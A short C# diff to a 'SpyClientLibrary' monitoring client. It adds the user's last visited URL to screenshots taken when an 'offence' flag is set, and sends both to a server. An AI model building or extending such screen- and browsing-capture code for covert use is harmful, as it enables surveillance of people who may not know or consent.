@@ -51,6 +51,8 @@ namespace SpyClientLibrary
                 {
                     ScreenShot screen = new ScreenShot(_user);
                     screen.isOffence = 1;
+                    var sendedpages = _taskmanager.getSendedPages();
+                    screen.Url = sendedpages.Last();
                     screen.GenerateCurrentScreen();
                     SendScreen(screen,_myWorkstation,_user);
                 }
@@ -118,7 +120,9 @@ namespace SpyClientLibrary
             {
                 Data = screen._data,
                 ScreenDate = screen._scrrenDate,
-                isOfense=screen.isOffence
+                isOfense = screen.isOffence,
+                Url = screen.Url
+                
             };
 
 
